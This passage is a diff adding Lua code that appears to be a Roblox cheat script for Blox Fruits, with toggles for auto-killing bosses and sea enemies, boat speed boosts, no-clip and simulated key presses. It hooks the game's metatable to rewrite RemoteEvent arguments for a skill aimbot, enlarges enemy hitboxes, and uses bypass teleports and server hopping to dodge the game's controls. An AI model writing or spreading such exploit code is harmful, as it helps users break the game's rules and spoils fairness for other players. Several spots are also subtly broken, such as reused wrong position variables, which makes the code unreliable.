+	fastpos(pos * CFrame.new(0, 40, 0));
+	wait(2);
+	fastpos(pos * CFrame.new(0, 300, 0));
+	wait(3);
+end;
+SeaTab:Toggle("Auto Kill Ghost Ship", _G.RelzFishBoat, "Auto Kill Use Skill", function(value)
+	_G.RelzFishBoat = value;
+	StopTween(_G.RelzFishBoat);
+	if not _G.RelzFishBoat then
+		_G.SeaSkill = false;
+		Skillaimbot = false;
+	end;
+end);
+SeaTab:Toggle("Auto Kill Pirate Brigade", _G.RelzPirateBrigade, "Auto Kill Enemies Use Skill", function(value)
+	_G.RelzPirateBrigade = value;
+	StopTween(_G.RelzPirateBrigade);
+end);
+SeaTab:Toggle("Auto Kill Pirate Grand Brigade", _G.RelzPirateGrandBrigade, "Auto Kill Enemies Use Skill", function(value)
+	_G.RelzPirateGrandBrigade = value;
+	StopTween(_G.RelzPirateGrandBrigade);
+end);
+SeaTab:Toggle("Auto Kill Terrorshark", _G.AutoTerrorshark, false, function(value)
+	_G.AutoTerrorshark = value;
+	StopTween(_G.AutoTerrorshark);
+end);
+SeaTab:Toggle("Auto Kill Seabest", false, false, function(value)
+	_G.AutoSeaBest = value;
+	StopTween(_G.AutoSeaBest);
+	if not _G.AutoSeaBest then
+		_G.SeaSkill = false;
+		Skillaimbot = false;
+	end;
+end);
+function CheckSeaBeast()
+	if (game:GetService("Workspace")):FindFirstChild("SeaBeasts") then
+		for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+			if v:FindFirstChild("Humanoid") or v:FindFirstChild("HumanoidRootPart") or v.Humanoid.Health < 0 then
+				return true;
+			end;
+		end;
+	end;
+	return false;
+end;
+SeaTab:Seperator("Ability");
+local BrightValue = 20;
+SeaTab:Slider("Brightness", 1, 100, BrightValue, function(value)
+	BrightValue = value;
+end);
+SeaTab:Button("Set Bright", function()
+	(game:GetService("Lighting")).Brightness = BrightValue;
+end);
+SeaTab:Toggle("Speed Boat", false, false, function(value)
+	_G.IncreaseBoatSpeed = value;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			local vehicleSeats = {};
+			for i, v in pairs(game.Workspace.Boats:GetDescendants()) do
+				if v:IsA("VehicleSeat") then
+					table.insert(vehicleSeats, v);
+				end;
+			end;
+			if _G.IncreaseBoatSpeed then
+				for _, v in pairs(vehicleSeats) do
+					v.MaxSpeed = 350;
+				end;
+			else
+				for _, v in pairs(vehicleSeats) do
+					v.MaxSpeed = 150;
+				end;
+			end;
+		end);
+	end;
+end);
+SeaTab:Toggle("No Clip Rock", false, "NoClip", function(state)
+	_G.NoClipRock = state;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			for i, boat in pairs((game:GetService("Workspace")).Boats:GetChildren()) do
+				for _, v in pairs((game:GetService("Workspace")).Boats[boat.Name]:GetDescendants()) do
+					if v:IsA("BasePart") then
+						if _G.NoClipRock or _G.SailBoat then
+							v.CanCollide = false;
+						else
+							v.CanCollide = true;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+SeaTab:Toggle("Auto Press W", _G.AutoPressW, "Auto W", function(state)
+	_G.AutoPressW = state;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.AutoPressW then
+				if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == true then
+					(game:GetService("VirtualInputManager")):SendKeyEvent(true, "W", false, game);
+				end;
+			end;
+		end);
+	end;
+end);
+DoneSkillGun = false;
+DoneSkillSword = false;
+DoneSkillFruit = false;
+DoneSkillMelee = false;
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.SeaSkill then
+				if _G.UseSeaFruitSkill and DoneSkillFruit == false then
+					for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+						if v:IsA("Tool") then
+							if v.ToolTip == "Blox Fruit" then
+								game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+							end;
+						end;
+					end;
+					if _G.SkillFruitZ then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+						wait(_G.SeaHoldSKillZ);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+					end;
+					if _G.SkillFruitX then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+						wait(_G.SeaHoldSKillX);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+					end;
+					if _G.SkillFruitC then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+						wait(_G.SeaHoldSKillC);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+					end;
+					if _G.SkillFruitV then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+						wait(_G.SeaHoldSKillV);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+					end;
+					if _G.SkillFruitF then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "F", false, game);
+						wait(_G.SeaHoldSKillF);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "F", false, game);
+					end;
+					DoneSkillFruit = true;
+				end;
+				if _G.UseSeaMeleeSkill and DoneSkillMelee == false then
+					for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+						if v:IsA("Tool") then
+							if v.ToolTip == "Melee" then
+								game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+							end;
+						end;
+					end;
+					if _G.SkillMeleeZ then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+					end;
+					if _G.SkillMeleeX then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+					end;
+					if _G.SkillMeleeC then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+					end;
+					if _G.SkillMeleeV then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+					end;
+					DoneSkillMelee = true;
+				end;
+				if _G.UseSeaSwordSkill and DoneSkillSword == false then
+					for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+						if v:IsA("Tool") then
+							if v.ToolTip == "Sword" then
+								game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+							end;
+						end;
+					end;
+					if _G.SkillSwordZ then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+					end;
+					if _G.SkillSwordX then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+						wait(0);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+					end;
+					DoneSkillSword = true;
+				end;
+				if _G.UseSeaGunSkill and DoneSkillGun == false then
+					for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+						if v:IsA("Tool") then
+							if v.ToolTip == "Gun" then
+								game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
+							end;
+						end;
+					end;
+					if _G.SkillGunZ then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+						wait(0.1);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+					end;
+					if _G.SkillGunX then
+						(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+						wait(0.1);
+						(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+					end;
+					DoneSkillGun = true;
+				end;
+				DoneSkillGun = false;
+				DoneSkillSword = false;
+				DoneSkillFruit = false;
+				DoneSkillMelee = false;
+			end;
+		end);
+	end;
+end);
+SeaTab:Seperator("Settings");
+SeaTab:Toggle("Use Skill Devil Fruit", true, "Use Fruit Skill", function(value)
+	_G.UseSeaFruitSkill = value;
+end);
+SeaTab:Toggle("Use Skill Melee", true, "Use Melee Skill", function(value)
+	_G.UseSeaMeleeSkill = value;
+end);
+SeaTab:Toggle("Use Skill Sword", true, "Use Sword Skill", function(value)
+	_G.UseSeaSwordSkill = value;
+end);
+SeaTab:Toggle("Use Skill Gun", true, "Use Gun Skill", function(value)
+	_G.UseSeaGunSkill = value;
+end);
+SeaTab:Label("[ Skill Fruit ]");
+SeaTab:Toggle("Skill Z", true, "Auto Skill Z", function(value)
+	_G.SkillFruitZ = value;
+end);
+SeaTab:Toggle("Skill X", true, "Auto Skill X", function(value)
+	_G.SkillFruitX = value;
+end);
+SeaTab:Toggle("Skill C", true, "Auto Skill C", function(value)
+	_G.SkillFruitC = value;
+end);
+SeaTab:Toggle("Skill V", false, "Auto Skill V", function(value)
+	_G.SkillFruitV = value;
+end);
+SeaTab:Toggle("Skill F", _G.SkillFruitF, "Auto Skill F", function(value)
+	_G.SkillFruitF = value;
+end);
+SeaTab:Label("[ Skill Melee ]");
+SeaTab:Toggle("Skill Z", true, "Auto Skill Z", function(value)
+	_G.SkillMeleeZ = value;
+end);
+SeaTab:Toggle("Skill X", true, "Auto Skill X", function(value)
+	_G.SkillMeleeX = value;
+end);
+SeaTab:Toggle("Skill C", true, "Auto Skill C", function(value)
+	_G.SkillMeleeC = value;
+end);
+SeaTab:Toggle("Skill V", _G.SkillMeleeV, "Auto Skill V", function(value)
+	_G.SkillMeleeV = value;
+end);
+SeaTab:Label("[ Skill Sword & Gun ]");
+SeaTab:Toggle("Skill Z", true, "Auto Skill Z", function(value)
+	_G.SkillSwordZ = value;
+	_G.SkillGunZ = value;
+end);
+SeaTab:Toggle("Skill X", true, "Auto Skill X", function(value)
+	_G.SkillSwordX = value;
+	_G.SkillGunX = value;
+end);
+function EquipAllWeapon()
+	pcall(function()
+		for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+			if v:IsA("Tool") and (not (v.Name == "Summon Sea Beast" or v.Name == "Water Body" or v.Name == "Awakening")) then
+				local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name);
+				game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid);
+				wait(1);
+			end;
+		end;
+	end);
+end;
+local gg = getrawmetatable(game);
+local old = gg.__namecall;
+setreadonly(gg, false);
+gg.__namecall = newcclosure(function(...)
+	local method = getnamecallmethod();
+	local args = {
+		...
+	};
+	if tostring(method) == "FireServer" then
+		if tostring(args[1]) == "RemoteEvent" then
+			if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
+				if Skillaimbot then
+					args[2] = AimBotSkillPosition;
+					return old(unpack(args));
+				end;
+			end;
+		end;
+	end;
+	return old(...);
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if UseSkill then
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Kill_At / 100 then
+						if _G.SkillZ then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+							wait(_G.HoldSKillZ);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+						end;
+						if _G.SkillX then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+							wait(_G.HoldSKillX);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+						end;
+						if _G.SkillC then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "C", false, game);
+							wait(_G.HoldSKillC);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "C", false, game);
+						end;
+						if _G.SkillV then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "V", false, game);
+							wait(_G.HoldSKillV);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "V", false, game);
+						end;
+						if _G.SkillF then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "F", false, game);
+							wait(_G.HoldSKillF);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "F", false, game);
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if UseGunSkill then
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.Kill_At / 100 then
+						if _G.SkillZ then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "Z", false, game);
+							wait(0.5);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "Z", false, game);
+						end;
+						if _G.SkillX then
+							(game:service("VirtualInputManager")):SendKeyEvent(true, "X", false, game);
+							wait(0.5);
+							(game:service("VirtualInputManager")):SendKeyEvent(false, "X", false, game);
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+if World2 then
+	ItemsTab:Toggle("Auto Dragon Trident", _G.Auto_Dragon_Trident, false, function(value)
+		_G.Auto_Dragon_Trident = value;
+		StopTween(_G.Auto_Dragon_Trident);
+	end);
+end;
+local TridentPos = CFrame.new(-3914.830322265625, 123.29389190673828, -11516.8642578125);
+spawn(function()
+	while wait() do
+		if _G.Auto_Dragon_Trident and World2 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Tide Keeper") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Tide Keeper" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Auto_Dragon_Trident or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - TridentPos.Position).Magnitude > 1500 then
+							BTP(TridentPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - TridentPos.Position).Magnitude < 1500 then
+							topos(TridentPos);
+						end;
+					else
+						topos(TridentPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-3914.830322265625, 123.29389190673828, -11516.8642578125));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Tide Keeper") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Tide Keeper")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+local NamfonPos = CFrame.new(5186.14697265625, 24.86684226989746, 832.1885375976562);
+spawn(function()
+	while wait() do
+		if _G.Autowaden and World1 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Chief Warden") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Chief Warden" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Autowaden or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - TridentPos.Position).Magnitude > 1500 then
+							BTP(TridentPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - TridentPos.Position).Magnitude < 1500 then
+							topos(TridentPos);
+						end;
+					else
+						topos(TridentPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(5186.14697265625, 24.86684226989746, 832.1885375976562));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Chief Warden") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Chief Warden")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+local GayMakPos = CFrame.new(-5023.38330078125, 28.65203285217285, 4332.3818359375);
+spawn(function()
+	while wait() do
+		if _G.Autogay and World1 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Greybeard") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Greybeard" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Autogay or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - GayMakPos.Position).Magnitude > 1500 then
+							BTP(GayMakPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - GayMakPos.Position).Magnitude < 1500 then
+							topos(GayMakPos);
+						end;
+					else
+						topos(GayMakPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-5023.38330078125, 28.65203285217285, 4332.3818359375));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Greybeard") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Greybeard")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+if World1 then
+	ItemsTab:Toggle("Auto Pole", _G.Autopole, false, function(value)
+		_G.Autopole = value;
+		StopTween(_G.Autopole);
+	end);
+	ItemsTab:Toggle("Auto Sharks saw", _G.Autosaw, false, function(value)
+		_G.Autosaw = value;
+		StopTween(_G.Autosaw);
+	end);
+	ItemsTab:Toggle("Auto Greybeard", _G.Autogay, false, function(value)
+		_G.Autogay = value;
+		StopTween(_G.Autogay);
+	end);
+end;
+local PolePos = CFrame.new(-7748.0185546875, 5606.80615234375, -2305.898681640625);
+spawn(function()
+	while wait() do
+		if _G.Autopole and World1 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Thunder God") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Thunder God" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Autopole or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - PolePos.Position).Magnitude > 1500 then
+							BTP(PolePos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - PolePos.Position).Magnitude < 1500 then
+							topos(PolePos);
+						end;
+					else
+						topos(TridentPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-7748.0185546875, 5606.80615234375, -2305.898681640625));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Thunder God") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Thunder God")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Swan Glasses", _G.AutoFarmSwanGlasses, "Auto Kill Don Swan", function(value)
+	_G.AutoFarmSwanGlasses = value;
+	StopTween(_G.AutoFarmSwanGlasses);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoFarmSwanGlasses then
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Don Swan") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Don Swan" and v.Humanoid.Health > 0 and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+							repeat
+								task.wait();
+								pcall(function()
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								end);
+							until _G.AutoFarmSwanGlasses == false or v.Humanoid.Health <= 0;
+						end;
+					end;
+				else
+					repeat
+						task.wait();
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(2284.912109375, 15.537666320801, 905.48291015625));
+					until ((CFrame.new(2284.912109375, 15.537666320801, 905.48291015625)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 or _G.AutoFarmSwanGlasses == false;
+				end;
+			end;
+		end;
+	end);
+end);
+local SharkPos = CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094);
+spawn(function()
+	while wait() do
+		if _G.Autosaw and World1 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("The Saw") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "The Saw" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								until not _G.Autosaw or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - SharkPos.Position).Magnitude > 1500 then
+							BTP(SharkPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - SharkPos.Position).Magnitude < 1500 then
+							topos(SharkPos);
+						end;
+					else
+						topos(SharkPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("The Saw") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("The Saw")).HumanoidRootPart.CFrame * CFrame.new(2, 40, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.AutoFarmSwanGlasses and _G.AutoFarmSwanGlasses_Hop and World2 and (not (game:GetService("ReplicatedStorage")):FindFirstChild("Don Swan [Lv. 1000] [Boss]")) and (not (game:GetService("Workspace")).Enemies:FindFirstChild("Don Swan [Lv. 1000] [Boss]")) then
+				Hop();
+			end;
+		end;
+	end);
+end);
+ItemsTab:Seperator("Observation");
+local ObservationRange = ItemsTab:Label("");
+spawn(function()
+	while wait() do
+		pcall(function()
+			ObservationRange:Set("Observation Range : " .. math.floor((game:GetService("Players")).LocalPlayer.VisionRadius.Value));
+		end);
+	end;
+end);
+ItemsTab:Toggle("Auto Farm Observation", _G.AutoObservation, false, function(value)
+	_G.AutoObservation = value;
+	StopTween(_G.AutoObservation);
+end);
+ItemsTab:Toggle("Auto V2 Observation", _G.AutoObservationv2, false, function(value)
+	_G.AutoObservationv2 = value;
+	StopTween(_G.AutoObservationv2);
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.AutoObservation then
+				repeat
+					task.wait();
+					if not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
+						(game:GetService("VirtualUser")):CaptureController();
+						(game:GetService("VirtualUser")):SetKeyDown("0x65");
+						wait(2);
+						(game:GetService("VirtualUser")):SetKeyUp("0x65");
+					end;
+				until (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") or (not _G.AutoObservation);
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoObservation then
+				if (game:GetService("Players")).LocalPlayer.VisionRadius.Value >= 5000 then
+					Alert:create("You Have Max Points");
+					wait(2);
+				elseif World2 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Lava Pirate [Lv. 1200]") then
+						if (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Lava Pirate")).HumanoidRootPart.CFrame * CFrame.new(3, 0, 0);
+							until _G.AutoObservation == false or (not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel"));
+						else
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Lava Pirate")).HumanoidRootPart.CFrame * CFrame.new(0, 50, 0) + wait(1);
+								if not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") and _G.AutoObservation_Hop == true then
+									(game:GetService("TeleportService")):Teleport(game.PlaceId, (game:GetService("Players")).LocalPlayer);
+								end;
+							until _G.AutoObservation == false or (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel");
+						end;
+					else
+						topos(CFrame.new(-5478.39209, 15.9775667, -5246.9126));
+					end;
+				elseif World1 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Galley Captain") then
+						if (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Galley Captain")).HumanoidRootPart.CFrame * CFrame.new(3, 0, 0);
+							until _G.AutoObservation == false or (not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel"));
+						else
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Galley Captain")).HumanoidRootPart.CFrame * CFrame.new(0, 50, 0);
+								wait(1);
+								if not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") and _G.AutoObservation_Hop == true then
+									(game:GetService("TeleportService")):Teleport(game.PlaceId, (game:GetService("Players")).LocalPlayer);
+								end;
+							until _G.AutoObservation == false or (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel");
+						end;
+					else
+						topos(CFrame.new(5533.29785, 88.1079102, 4852.3916));
+					end;
+				elseif World3 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Giant Islander") then
+						if (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Giant Islander")).HumanoidRootPart.CFrame * CFrame.new(3, 0, 0);
+							until _G.AutoObservation == false or (not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel"));
+						else
+							repeat
+								task.wait();
+								(game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = ((game:GetService("Workspace")).Enemies:FindFirstChild("Giant Islander")).HumanoidRootPart.CFrame * CFrame.new(0, 50, 0);
+								wait(1);
+								if not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") and _G.AutoObservation_Hop == true then
+									(game:GetService("TeleportService")):Teleport(game.PlaceId, (game:GetService("Players")).LocalPlayer);
+								end;
+							until _G.AutoObservation == false or (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel");
+						end;
+					else
+						topos(CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789));
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Get Saber", _G.AutoSaber, "Auto Get Saber", function(value)
+	_G.Auto_Saber = value;
+	StopTween(_G.Auto_Saber);
+end);
+spawn(function()
+	while task.wait() do
+		if _G.Auto_Saber and game.Players.LocalPlayer.Data.Level.Value >= 200 then
+			pcall(function()
+				if (game:GetService("Workspace")).Map.Jungle.Final.Part.Transparency == 0 then
+					if (game:GetService("Workspace")).Map.Jungle.QuestPlates.Door.Transparency == 0 then
